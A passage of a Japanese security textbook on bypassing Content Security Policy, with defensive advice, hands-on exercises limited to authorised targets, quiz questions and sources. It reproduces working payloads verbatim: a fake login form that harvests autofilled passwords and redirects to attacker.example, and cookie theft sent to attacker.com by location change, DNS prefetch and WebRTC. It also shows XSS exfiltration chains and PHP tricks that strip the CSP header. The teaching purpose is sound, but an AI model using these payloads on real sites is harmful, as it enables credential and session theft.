`default-src 'none'; script-src 'none'; style-src 'none'; img-src 'none'; connect-src 'none'; frame-src 'none'; form-action 'self'` のような**非常に厳格なCSP**でも、ログインページに反射型HTMLインジェクションがあればJSなしで保存済み認証情報を盗める。手順は次のとおり。

1. 信頼origin内に偽ログインフォームを注入（逐語）:
```html
<form action="/">
  <input type="email" name="email" />
  <input type="password" name="password" />
  <input type="submit" />
</form>
```
2. 被害者がそのoriginの認証情報を保存していると、パスワードマネージャが注入フィールドを自動入力する。
3. フォームに `method` が無いためHTMLは既定で `GET` になり、submitで認証情報がURLに入る（例 `/?email=victim%40mail.com&password=Secret123`）。
4. 注入が再度反射するなら、遷移を強制して認証情報入りURLを `Referer` ヘッダでリークする（逐語）:
```html
<meta name="referrer" content="unsafe-url">
<meta http-equiv="Refresh" content="0;url=https://attacker.example/">
```

これは `form-action 'self'` が攻撃者ドメインへの直接送信をブロックする場合に効く。まず**same-origin**へ送らせ、反射ページが即cross-originへ**リダイレクト**して、直前URL全体を `Referer` でリークさせる。

補足（原資料の要点）:
- `strict-origin-when-cross-origin` が現代の既定referrerポリシーなので、cross-originでpath/queryを含めるには `unsafe-url` のような弱いポリシーを**注入**する必要がしばしばある。
- `<meta http-equiv="Refresh">` はJS不要で、スクリプト/接続のみ制限するCSPを生き残ることが多い。
- inline CSSが許可されるなら、不可視の全画面submitボタンで**any-click（どこをクリックしても発火）**攻撃に変えられる（逐語）:
```html
<input type="submit" style="position:fixed;top:0;left:0;width:100vw;height:100vh;z-index:999999;opacity:0">
```

防御側の要点: 本当の修正はHTMLインジェクションの解消。多層防御として、認証情報フォームは `POST` を強制し、明示的で制限的な `Referrer-Policy`（例 `no-referrer` / `same-origin`）を設定し、攻撃者注入フォームにパスワードマネージャが自動入力しないか監査する。

### 11-2. dangling markup（HTMLだけの情報漏洩）

dangling markup injection とは、閉じられていない属性やタグを注入し、後続のHTML（トークンやCSRFトークンを含む）を丸ごと自分のサーバへ取り込ませる手法のこと。`base-uri` が無いと、この手法が特に効く。`img-src *;` via XSS のように、画像読み込み先を攻撃者サーバに向けて情報を吸い出す形になる。CSPページ本体には手法名のみが載り、実体は別ページで解説されている。

> ### 📌 ここは自分で開いて読んでください
> **資料**: dangling markup / HTML scriptless injection（HackTricks別ページ） — https://hacktricks.wiki/en/pentesting-web/dangling-markup-html-scriptless-injection/index.html
> **なぜ**: 本教科書の執筆環境からは自動取得できなかった（理由: `hacktricks.wiki` は組織egressプロキシで403）。以下は原資料の参照にもとづく要約である。
> **読みどころ**:
> 1. 閉じられていない属性/タグでの後続HTML取り込み。
> 2. `<img src='...`・`<base>` を使ったトークン/CSRFトークン窃取。
> 3. form/textarea を使ったdangling。
> 4. CSP下でのscriptless（スクリプト無し）exfil。
> **代替手段**: 公式GitHubソース https://github.com/HackTricks-wiki/hacktricks（`src/pentesting-web/dangling-markup-html-scriptless-injection/` 配下）

### 11-3. `'unsafe-inline'; img-src *;` 経由のexfil

`'unsafe-inline'` で任意スクリプト実行（XSS）ができ、`img-src *` で任意ソースの画像を使えるなら、画像リクエストでデータをexfilできる。次はCTFの例で、XSSがCSRFを悪用し、botがアクセスできるページのSQLiでflagを画像経由で抽出する（逐語）。

```javascript
<script>
  fetch('http://x-oracle-v0.nn9ed.ka0labs.org/admin/search/x%27%20union%20select%20flag%20from%20challenge%23').then(_=>_.text()).then(_=>new
  Image().src='http://PLAYER_SERVER/?'+_)
</script>
```

この設定は、画像内に仕込んだJSの読み込みにも悪用できる。たとえばTwitterからの画像読み込みを許すページなら、特製画像をTwitterに上げ、`'unsafe-inline'` を悪用して画像からJSを取り出して実行できる。

### 11-4. `img-src *;` via iframe — タイミング攻撃

`'unsafe-inline'` が無くても、XSSで `<iframe>` を使い、被害者に攻撃者の制御ページを読ませ、そこから抽出したいページ（CSRF）へアクセスさせられる。ページ内容には触れられなくても、**読み込みにかかる時間**を制御できれば情報を抽出できる。SQLiで1文字当てるたびに `sleep` で応答が遅くなることを利用してflagを1文字ずつ復元する（逐語で一部を掲載）。

```html
<!--code from https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle -->
<iframe name="f" id="g"></iframe> // The bot will load an URL with the payload
<script>
  let host = "http://x-oracle-v1.nn9ed.ka0labs.org"
  function gen(x) {
    x = escape(x.replace(/_/g, "\\_"))
    return `${host}/admin/search/x'union%20select(1)from%20challenge%20where%20flag%20like%20'${x}%25'and%201=sleep(0.1)%23`
  }
  async function query(word, end = false) {
    let h = performance.now()
    f.location = end ? gen2(word) : gen(word)
    await new Promise((r) => { g.onload = r })
    let diff = performance.now() - h
    return diff > 300
  }
</script>
```

`performance.now()` でiframe読み込みの前後時間差を測り、`300` ミリ秒を超えたら「その文字が正解」と判定する。ページ内容を読めない厳格CSP下でも、時間という副次チャネルで情報が漏れる好例である。

### 11-5. iframeとsecuritypolicyviolationで秘密URLをリーク

CSPが許可するURLを指す `iframe` を作り、そのURLがCSPで**許可されない**秘密URLへリダイレクトするよう仕向ける。ブラウザは `securitypolicyviolation` イベントを発火し、その `blockedURI` プロパティにブロックされたURIのドメインが入る。これでリダイレクト先の秘密ドメインが漏れる。

さらに、CSP自体を悪用して秘密サブドメインを二分探索する手法もある。意図的に特定ドメインをブロックするようCSPを調整し、どのリクエストがブロック/許可されるかを観察して、秘密サブドメインの文字を絞り込む（逐語のCSP例）。

```text
img-src https://chall.secdriven.dev https://doc-1-3213.secdrivencontent.dev https://doc-2-3213.secdrivencontent.dev ... https://doc-17-3213.secdriven.dev
```

ChromeとFirefoxはiframeのCSP処理挙動が異なり、未定義動作から機微情報が漏れる可能性がある。

### 11-6. 外部通信できない厳格CSPでのexfil経路

外部サーバと通信できないほど厳格なCSPでも、次のような持ち出し経路がある。

#### location更新
```javascript
var sessionid = document.cookie.split("=")[1] + "."
document.location = "https://attacker.com/?" + sessionid
```

#### metaタグでリダイレクト（単なる遷移。内容はリークしない）
```html
<meta http-equiv="refresh" content="1; http://attacker.com" />
```

#### DNS Prefetch
ブラウザはページ高速化のためホスト名を事前解決する。`<link rel="dns-prefetch">` を悪用し、DNS要求で機微情報を持ち出す（逐語）。
```javascript
var sessionid = document.cookie.split("=")[1] + "."
var body = document.getElementsByTagName("body")[0]
body.innerHTML =
  body.innerHTML +
  '<link rel="dns-prefetch" href="//' +
  sessionid +
  'attacker.ch">'
```
防止のためサーバは次のヘッダを送れる。
```text
X-DNS-Prefetch-Control: off
```
なおこの手法はヘッドレスブラウザ（bot）では動かないようだ、という注記がある。

#### WebRTC
多くのページで**WebRTCはCSPの `connect-src` をチェックしない**とされ、DNS要求で情報を漏らせる（逐語）。
```javascript
;(async () => {
  p = new RTCPeerConnection({ iceServers: [{ urls: "stun:LEAK.dnsbin" }] })
  p.createDataChannel("")
  p.setLocalDescription(await p.createOffer())
})()
```

#### CredentialsContainer
credentialポップアップはページに制限されず iconURL へDNS要求を送る。secure context（HTTPS）またはlocalhostでのみ動作する（逐語）。
```javascript
navigator.credentials.store(
  new FederatedCredential({
    id:"satoki",
    name:"satoki",
    provider:"https:"+your_data+"example.com",
    iconURL:"https:"+your_data+"example.com"
    })
  )
```

---

## 12. CSPを注入・改変して無力化する

### 12-1. Policy Injection（ポリシー注入）

送ったパラメータがCSP宣言内に反射する場合、ポリシーを改変して無力化できる。

Chromeでは、次のいずれかで `script 'unsafe-inline'` を許可できる。これらのディレクティブが既存の `script-src` を**上書き**するためである（逐語）。
```text
script-src-elem *; script-src-attr *
script-src-elem 'unsafe-inline'; script-src-attr 'unsafe-inline'
```

Edgeはさらに簡単で、CSPに `;_` を追加できればポリシー全体を**破棄**する。

> ### 📌 ここは自分で開いて読んでください
> **資料**: PortSwigger Research「Bypassing CSP with policy injection」 — https://portswigger.net/research/bypassing-csp-with-policy-injection
> **なぜ**: 本教科書の執筆環境からは全文の逐語取得を行っていない（理由: 外部リサーチ記事の参照断片）。以下は原資料の参照にもとづく要約である。
> **読みどころ**:
> 1. パラメータがCSP宣言に反射する条件の見つけ方。
> 2. `script-src-elem`／`script-src-attr` による上書き。
> 3. Edgeの `;_` によるポリシー全破棄。
> 4. ラボURLでの再現手順。
> **代替手段**: PortSwigger Web Security Academy のCSPラボ（無料）

### 12-2. `Content-Security-Policy-Report-Only` を使ったexfil

サーバに `Content-Security-Policy-Report-Only` ヘッダを**自分の制御値**（CRLF注入等）で返させられれば、レポート先を自分のサーバに向けられる。exfilしたいJS内容を `<script>` で包むと、`'unsafe-inline'` が許可されずCSPエラーが発生し、そのスクリプトの一部（機微情報を含む）が `Report-Only` のレポート先へ送られる。

### 12-3. iframeの `csp` 属性でより厳格にして回避

許可iframe内に**より厳格なCSP**を注入し、特定JSファイルの読み込みを禁止すると、prototype pollution（プロトタイプ汚染）やDOM clobbering（DOMクロバリング）で別スクリプトに任意スクリプトを読ませられる。iframeのCSPは `csp` 属性で制限できる（逐語）。
```html
<iframe
  src="https://biohazard-web.2023.ctfcompetition.com/view/[bio_id]"
  csp="script-src https://biohazard-web.2023.ctfcompetition.com/static/closure-library/ https://biohazard-web.2023.ctfcompetition.com/static/sanitizer.js https://biohazard-web.2023.ctfcompetition.com/static/main.js 'unsafe-inline' 'unsafe-eval'"></iframe>
```

HTMLの `<meta>` でCSPをより厳格化し、nonce許可エントリを削除してinlineスクリプトを無効化しつつ、shaで特定inlineスクリプトだけを有効化する例もある（逐語）。
```html
<meta
  http-equiv="Content-Security-Policy"
  content="script-src 'self'
'unsafe-eval' 'strict-dynamic'
'sha256-whKF34SmFOTPK4jfYDy03Ea8zOwJvqmz%2boz%2bCtD7RE4='
'sha256-Tz/iYFTnNe0de6izIdG%2bo6Xitl18uZfQWapSbxHE6Ic=';" />
```

### 12-4. SOME（Same-Origin Method Execution）＋WordPress

SOMEとは、あるエンドポイントのXSS（または極めて限定的なXSS）を使って、**同一originの別エンドポイント**を悪用する技法のこと。攻撃者ページから脆弱エンドポイントを読み、次に攻撃者ページを実エンドポイントへ更新すると、`opener` オブジェクト経由で実エンドポイントのDOMにアクセスできる。

WordPressは `/wp-json/wp/v2/users/1?_jsonp=data` にJSONPエンドポイントを持ち、送信データを出力に反射する（文字・数字・ドットのみ）。これを `'self'` で許可されるスクリプトとして埋め込み、SOME攻撃でユーザ権限昇格や新規プラグインインストールまで狙える。

### 12-5. その他の既知CVE・技法

- **CVE-2020-6519**: `javascript:` URLの `<iframe>` を使ってscriptを注入するChromeのCSPバイパス。
- **Service Workers**: `importScripts` はCSPに制限されないため、Service Worker経由で任意スクリプトを読める。
- **Bookmarklets**: ブックマークレットにリンクをドラッグ&ドロップさせるソーシャルエンジニアリングで、現在ウィンドウのコンテキストでJSを実行しCSPを回避する。

---

## 13. サーバ実装不備でCSPヘッダを落とす

これまではCSPの中身を突く話だったが、そもそもCSPヘッダを**サーバに送らせない**攻撃もある。PHPの挙動を突く例が代表的である。

### 13-1. パラメータ過多で header() を無効化

PHPの `header()` は出力の前に呼ばないと効かない。入力が `max_input_vars`（既定1000）を超えると、PHPはまず起動時警告を出し、その後の `header('Content-Security-Policy: ...')` は「headers already sent」で失敗する。結果、CSPが実質無効化され、本来ブロックされる反射XSSが通る（逐語）。

```php
<?php
header("Content-Security-Policy: default-src 'none';");
echo $_GET['xss'];
```

攻撃の再現例（逐語）:
```bash
# CSP in place → payload blocked by browser
curl -i "http://orange.local/?xss=<svg/onload=alert(1)>"

# Exceed max_input_vars to force warnings before header() → CSP stripped
curl -i "http://orange.local/?xss=<svg/onload=alert(1)>&A=1&A=2&...&A=1000"
# Warning: PHP Request Startup: Input variables exceeded 1000 ...
# Warning: Cannot modify header information - headers already sent
```

GETなら約1001個、POSTでも可、ファイル20個超でも同様の効果が出る、とされる。

### 13-2. レスポンスバッファ過負荷

PHPは既定でレスポンスを4096バイトバッファする。警告表示時に警告内へ十分なデータを詰めると、CSPヘッダより前に本文が送信され、ヘッダが無視される。つまり**警告でレスポンスバッファを埋め**、CSPヘッダを送らせない。

### 13-3. エラーページの書き換え

CSPが無い（かもしれない）エラーページを開き、その内容を書き換えてCSP保護を回避する例（逐語）。
```javascript
a = window.open("/" + "x".repeat(4100))
setTimeout(function () {
  a.document.body.innerHTML = `<img src=x onerror="fetch('https://filesharing.m0lec.one/upload/ffffffffffffffffffffffffffffffff').then(x=>x.text()).then(x=>fetch('https://enllwt2ugqrt.x.pipedream.net/'+x))">`
}, 1000)
```

これらは「CSPは完璧なヘッダでも、サーバがそれを送れなければ意味がない」という重要な教訓を示す。防御側はCSP設定に加え、header送信前の警告出力・出力バッファリング・エラーページのCSP付与まで見る必要がある。

---

## 14. `'self'` ＋ `'unsafe-inline'` ＋ iframe の合わせ技

最後に、原資料が別ページで解説する具体技法を1つ収録する。対象ポリシーは次（逐語）。
```text
Content-Security-Policy: default-src 'self' 'unsafe-inline';
```

`script-src` が無いので `default-src` がフォールバックになる。same-originスクリプトとinlineスクリプトは許可するが、`'unsafe-eval'` が無いので `eval()` や `setTimeout()`/`setInterval()` への文字列引数のような「文字列→コード」APIは許可しない。すでに弱いCSP（`'unsafe-inline'` でinline JSが動く）だが、**別スクリプトを読むにはより制限の緩いsame-originの子ドキュメント**が要る、という状況で効く。

### 14-1. テキスト・画像を子ドキュメントにする

一部のブラウザ/サーバの組み合わせは、iframeに置いたsame-originのテキスト/画像応答をドキュメントとしてレンダリングする。候補は `robots.txt`・`favicon.ico`・スタイルシート等の静的リソース。その応答が独自のCSPを持たずsame-originなら、親スクリプトが子DOMにscript要素を追加できることがある。挙動はcontent-type・ヘッダ・ブラウザ依存なので、普遍と決めつけず実標的で検証すること（逐語）。

```javascript
frame = document.createElement("iframe")
frame.onload = () => {
  script = document.createElement("script")
  script.src = "//example.com/csp.js"
  frame.contentDocument.head.appendChild(script)
}
frame.src = "/css/bootstrap.min.css"
document.body.appendChild(frame)
```

### 14-2. エラー応答を子ドキュメントにする

アプリやリバースプロキシが、CSPなしのsame-originエラードキュメントを返すことがある。それをframe化して親からアクセスできれば、制限の緩い子コンテキストになる（逐語）。

```javascript
// Inducing an nginx error
frame = document.createElement("iframe")
frame.src = "/%2e%2e%2f"
document.body.appendChild(frame)

// Triggering an error with a long URL
frame = document.createElement("iframe")
frame.src = "/" + "A".repeat(20000)
document.body.appendChild(frame)

// Generating an error via extensive cookies
for (var i = 0; i < 5; i++) {
  document.cookie = i + "=" + "a".repeat(4000)
}
frame = document.createElement("iframe")
frame.src = "/"
document.body.appendChild(frame)
// Remove the test cookies after execution.
for (var i = 0; i < 5; i++) {
  document.cookie = i + "=; Max-Age=0; path=/"
}
```

エラー応答を使うときは、子ドキュメントの読み込み完了後に改変するため、frameを遷移させる**前に** `onload` ハンドラを付けること。

---

## 15. CSPの診断ツールと自動生成

CSPの弱点は、次のオンラインツールで機械的に洗い出せる。防御側の設定確認にも、攻撃者の弱点発見にも同じツールが役立つ。

| ツール | 用途 |
| --- | --- |
| https://csp-evaluator.withgoogle.com/ | Google製。CSP文字列を貼ると危険な設定（`'unsafe-inline'`・ワイルドカード・既知の悪用可能ドメイン等）を指摘する |
| https://cspvalidator.org/ | CSPの構文・弱点を検証する |

さらに csper.io は、観測されたリソースから候補ポリシーを生成する方法を提供する。

- csper.io: Generating a Content Security Policy — https://csper.io/docs/generating-content-security-policy

---

## 手を動かす

1. 自分の検証用サイト（自分で立てたローカル環境やバグバウンティで許可された対象のみ）のレスポンスヘッダを確認する。ブラウザの開発者ツールを開き、Networkタブでドキュメントのレスポンスヘッダを見て `Content-Security-Policy` または `Content-Security-Policy-Report-Only` を探す。
2. 見つけたCSP文字列をコピーし、`https://csp-evaluator.withgoogle.com/` に貼り付けて実行する。指摘された項目（`'unsafe-inline'` の有無、`object-src`・`base-uri`・`default-src` の欠落、ワイルドカード）を1つずつ読む。
3. ディレクティブごとに本節の「主要ディレクティブ一覧」「ソース値一覧」と照合し、どのリソース種別が緩いか、どれが `default-src` にフォールバックしているかを紙に書き出す。
4. `script-src` に `'self'` ＋許可ドメインがある場合、その許可ドメインにJSONPエンドポイントやオープンリダイレクトが無いか確認する。JSONBee（https://github.com/zigoo0/JSONBee ）の `jsonp.txt` と許可ドメインを突き合わせる。
5. `base-uri` が書かれていなければ、そのページが相対パスでスクリプトを読んでいないかHTMLソースを確認する。相対パス＋nonce＋`base-uri`欠落が揃えば `<base>` 乗っ取りの候補になる。
6. `form-action` が書かれていなければ、ログインフォーム等でパスワード自動入力が働く箇所を探す（許可された対象・自分の環境でのみ）。
7. 見つけた弱点を、必ず**防御案とセット**でレポートに書く。たとえば「`object-src` 欠落 → `object-src 'none'` を追加」「`'unsafe-inline'` → nonce/hash方式へ移行」のように、直し方まで書く。

---

## つまずきポイント

- **CSP＝XSS対策、ではない**。CSPは多層防御の一層。第一の防御は出力エンコーディングと入力検証。CSPだけを頼りにXSSを放置してはいけない。
- **書いていないディレクティブは `default-src` を継承する**。ただし `form-action`・`base-uri`・`frame-ancestors` は継承**しない**。`default-src 'none'` でも form送信やbase乗っ取りは止まらない。
- **`Content-Security-Policy-Report-Only` は強制しない**。これで「入れたつもり」になっている設定ミスが多い。診断ではヘッダ名を必ず確認する。
- **許可ドメインは「そのドメインの中身」まで許可している**。CDNを許可するとその中の脆弱ライブラリ（AngularJS等のscript gadget）まで、Facebook等を許可するとexfilトンネルまで許してしまう。
- **PoCがそのまま動くとは限らない**。原資料にも「no longer working」「現在は動作しないように見える」注記が多い。ブラウザの更新で塞がれた手法があるので、実標的で検証する。
- **nonceは万能ではない**。JSを少しでも実行できればページ内のnonceを読み出して再利用できる。`strict-dynamic` があれば読み出しすら不要。
- **JS実行不可＝安全、ではない**。form-action欠落での認証情報窃取、DNS prefetch・WebRTC・タイミング攻撃など、スクリプトなし/exfilのみの経路が多数ある。
- **CSPヘッダ自体が落とされることがある**。PHPの警告・`max_input_vars` 超過・バッファ過負荷・CRLFでヘッダを消す/書き換える攻撃がある。

---

## この節のまとめ

- CSP（Content Security Policy）は、Webページが「どのリソースをどのoriginから読み込み・実行してよいか」をブラウザに宣言するレスポンスヘッダ（または `<meta>`）である。
- CSPの主目的はXSS等コンテンツインジェクションの被害緩和で、XSSの完全対策ではなく多層防御の一層。第一の防御は出力エンコーディングと入力検証。
- `Content-Security-Policy` は強制、`Content-Security-Policy-Report-Only` は監視のみ。ヘッダ名の取り違えが設定ミスになる。
- 明示していないディレクティブは `default-src` を継承する。ただし `form-action`・`base-uri`・`frame-ancestors` は継承しない。
- スクリプト実行に直結する定番の穴は `'unsafe-inline'`・`'unsafe-eval'`・ワイルドカード `*`・`https:`・`data:`、および `object-src`・`default-src`・`base-uri` の欠落。
- ホワイトリストしたCDN（AngularJS等のscript gadget）、JSONPエンドポイント、オープンリダイレクト、ファイルアップロード、RPO、リダイレクトでパス制限を回避される。
- 許可されがちな第三者ドメイン（Facebook/Hotjar/jsDelivr/CloudFront/AWS/Azure/Heroku/Firebase等）はexfilやコード実行に悪用され得る。
- nonce方式でも、ページ内のnonceを `querySelector("[nonce]")` で読み出して再利用したり、`strict-dynamic` で許可済みスクリプトに新スクリプトを生成させれば実行できる。
- `base-uri` 欠落は、相対パス読み込みスクリプトの `<base>` 乗っ取りとdangling markupを招く。
- スクリプト実行が無理でも、form-action欠落＋パスワードマネージャ自動入力での認証情報窃取、`img-src *`・DNS prefetch・WebRTC・CredentialsContainer等でのexfil、iframe/`securitypolicyviolation` での秘密URLリーク、タイミング攻撃など「JSなし/exfilのみ」の経路が多数ある。
- CSP注入（Chromeの `script-src-elem`/`script-src-attr` 上書き、Edgeの `;_` 破棄）、`Report-Only` を使ったexfil、iframeの `csp` 属性、SOME＋WordPressでCSP自体を改変・悪用できる。
- サーバ実装不備（PHPの header送信前警告、`max_input_vars` 超過、レスポンスバッファ4096B、エラーページ、CRLFでの `Report-Only` 注入）でCSPヘッダそのものを落とす/書き換える攻撃も成立する。
- 二大診断ツールは csp-evaluator.withgoogle.com と cspvalidator.org。csper.io はポリシー自動生成を提供する。
- 攻撃手法の検証は、許可された診断・バグバウンティ・自分で立てた環境に限り、必ず防御・検出策とセットで扱う。

---

## 理解度チェック

**Q1.** 「CSPを入れればXSSは防げる」という主張は正しいか。理由も述べよ。
▶ 答え: 正しくない。CSPはコンテンツインジェクションに対する追加の防御層（多層防御の一層）であり、被害を緩和するもの。第一の防御線は出力エンコーディングと入力検証である。CSPだけを頼りにXSSを放置してはいけない。

**Q2.** 次のCSPで、inlineスクリプト `"/><script>alert(1)</script>` はブロックされるか。なぜか。
`Content-Security-Policy: default-src 'self'; script-src https://bhaveshthakur.com; report-uri /Report-parsing-url;`
▶ 答え: ブロックされる。`script-src` に `'unsafe-inline'` が無く、`default-src 'self'` もinlineを許可しないため。明示していないinline許可は `default-src` を継承するが、`'self'` はinlineを通さない。

**Q3.** `default-src 'none'` と書いてあるのに、フォーム送信で認証情報が盗まれた。なぜ起こり得るか。
▶ 答え: `form-action` は `default-src` にフォールバックしないため。`form-action` を明示していないと、`default-src 'none'` でもフォーム送信は制限されない。反射型HTMLインジェクション＋パスワードマネージャ自動入力＋`GET`＋`Referer` リークで認証情報が漏れる。

**Q4.** `script-src 'self' https://cdnjs.cloudflare.com/` のように著名CDNを許可するとなぜ危険か。
▶ 答え: そのCDNが配る脆弱バージョンのライブラリ（AngularJS等のscript gadget）を読み込むと、`{{...}}` 式などでサンドボックスを脱出して任意JSを実行できるため。CDNを許可することは「その中の全ライブラリの全機能」を許可することに等しい。

**Q5.** nonce方式のCSPでも、少しでもJSを実行できると回避されうる。その手口を1つ挙げよ。
▶ 答え: ページ内で既に使われているnonceを `doc.defaultView.top.document.querySelector("[nonce]")` で読み出し、それを自作のscript要素の `nonce` 属性に設定して読み込ませる。`strict-dynamic` があれば、許可済みスクリプトに新scriptを生成させるだけでよく、nonce読み出しすら不要。

**Q6.** JavaScriptをまったく実行できない厳格CSP下でも情報を持ち出せる経路を3つ挙げよ。
▶ 答え: 例として、(1) DNS Prefetch（`<link rel="dns-prefetch">` でホスト名にデータを載せDNS要求で漏らす）、(2) WebRTC（`connect-src` をチェックしないため `stun:`/`turn:` のDNS要求で漏らす）、(3) CredentialsContainer（credentialポップアップの `iconURL` へのDNS要求）。他に `<meta http-equiv="Refresh">` でのリダイレクト、`securitypolicyviolation` の `blockedURI` リーク、タイミング攻撃など。

**Q7.** PHPアプリでCSPヘッダが送られず反射XSSが通った。CSP文字列自体は正しいのに、なぜヘッダが消えたのか。1つ説明せよ。
▶ 答え: 例として、入力が `max_input_vars`（既定1000）を超えるとPHPが起動時警告を先に出力し、その後の `header('Content-Security-Policy: ...')` が「headers already sent」で失敗するため。他にレスポンスバッファ（4096B）を警告で埋めてヘッダより先に本文を送らせる手法もある。

**Q8.** 自分のバグバウンティ対象でCSPの弱点を見つけた。レポートに必ず添えるべきものは何か。
▶ 答え: 防御・修正案。攻撃手法は必ず防御・検出策とセットで扱う。たとえば「`object-src` 欠落 → `object-src 'none'` を追加」「`'unsafe-inline'` → nonce/hash方式へ移行」「`base-uri` 欠落 → `base-uri 'self'` を追加」のように、どう直すかまで書く。検証は許可された対象・自分の環境に限る。

**Q9.** `base-uri` ディレクティブが無いと成立する攻撃を1つ説明せよ。
▶ 答え: ページが相対パスでスクリプトを読み（例 `<script src="/js/app.js">`）nonceを使っている場合、`<base href="https://www.attacker.com/" />` を注入して基準URLを攻撃者サーバに書き換え、そのスクリプトを自分のサーバから読ませてXSSにできる。また `base-uri` 欠落はdangling markup injectionも招く。

---

## 出典

- Content Security Policy (CSP) Bypass Techniques（bhaveshk90 GitHub README）: https://github.com/bhaveshk90/Content-Security-Policy-CSP-Bypass-Techniques/blob/main/README.md
- HackTricks「Content Security Policy (CSP) Bypass」: https://hacktricks.wiki/en/pentesting-web/content-security-policy-csp-bypass/index.html
- HackTricks「CSP Bypass via 'self', 'unsafe-inline', and Iframes」サブページ（HackTricks-wiki/hacktricks `csp-bypass-self-+-unsafe-inline-with-iframes.md`）
- CSP bypass on portswigger.net using Google script resources（joaxcar.com）: https://joaxcar.com/blog/2024/02/19/csp-bypass-on-portswigger-net-using-google-script-resources/
- Stealing Passwords from Infosec Mastodon Without Bypassing CSP（PortSwigger Research）: https://portswigger.net/research/stealing-passwords-from-infosec-mastodon-without-bypassing-csp
- AngularJS CSP bypass via cdnjs（blog.huli.tw）: https://blog.huli.tw/2022/09/01/en/angularjs-csp-bypass-cdnjs/
- Dress Code: The Talk（SensePost、第三者ドメイン悪用）: https://sensepost.com/blog/2023/dress-code-the-talk/#bypasses
- H5SC Minichallenge 3: "Sh*t, it's CSP!"（cure53 XSSChallengeWiki）: https://github.com/cure53/XSSChallengeWiki/wiki/H5SC-Minichallenge-3:-%22Sh*t,-it's-CSP!%22
- Bypassing CSP with Policy Injection（PortSwigger Research）: https://portswigger.net/research/bypassing-csp-with-policy-injection
- JSONBee（JSONPエンドポイント集）: https://github.com/zigoo0/JSONBee
- CSP Level 2 spec – Paths and Redirects（W3C）: https://www.w3.org/TR/CSP2/#source-list-paths-and-redirects
- x-oracle CTF writeup（ka0labs）: https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle
- Bypassing CSP via a WordPress SOME attack（octagon.net）: https://octagon.net/blog/2022/05/29/bypass-csp-using-wordpress-by-abusing-same-origin-method-execution/
- justCTF 2020 writeup – Baby CSP（hackmd.io）: https://hackmd.io/@terjanq/justCTF2020-writeups#Baby-CSP-web-6-solves-406-points
- csp-evaluator: https://csp-evaluator.withgoogle.com/ ／ cspvalidator: https://cspvalidator.org/ ／ csper.io: https://csper.io/docs/generating-content-security-policy

<!-- sources: https://github.com/bhaveshk90/Content-Security-Policy-CSP-Bypass-Techniques/blob/main/README.md, https://hacktricks.wiki/en/pentesting-web/content-security-policy-csp-bypass/index.html, https://portswigger.net/research/bypassing-csp-with-policy-injection, https://sensepost.com/blog/2023/dress-code-the-talk/#bypasses, https://github.com/zigoo0/JSONBee -->
<!-- terms: CSP, Content Security Policy, unsafe-inline, unsafe-eval, nonce, strict-dynamic, default-src, object-src, base-uri, form-action, script gadget, JSONP, オープンリダイレクト, dangling markup, RPO, SOME, exfiltration, WebRTC, DNS Prefetch, CredentialsContainer, policy injection, CSTI, ng-csp, Content-Security-Policy-Report-Only, frame-ancestors -->
<!-- self-read: https://hacktricks.wiki/en/pentesting-web/content-security-policy-csp-bypass/index.html | hacktricks.wikiが組織egressプロキシで403。内容は公式GitHubソースから同一markdownを取得済み -->
<!-- self-read: https://github.com/zigoo0/JSONBee | 外部リポジトリで随時更新されるため逐語取得せず、参照断片ベースの要約 -->
<!-- self-read: https://blog.huli.tw/2022/09/01/en/angularjs-csp-bypass-cdnjs/ | 外部ブログの参照断片。逐語取得せず要約 -->
<!-- self-read: https://github.com/cure53/XSSChallengeWiki/wiki/H5SC-Minichallenge-3:-%22Sh*t,-it's-CSP!%22 | 外部Wikiの参照断片。逐語取得せず要約 -->
<!-- self-read: https://hacktricks.wiki/en/pentesting-web/dangling-markup-html-scriptless-injection/index.html | hacktricks.wikiが組織egressプロキシで403。参照断片ベースの要約 -->
<!-- self-read: https://portswigger.net/research/bypassing-csp-with-policy-injection | 外部リサーチ記事の参照断片。逐語取得せず要約 -->
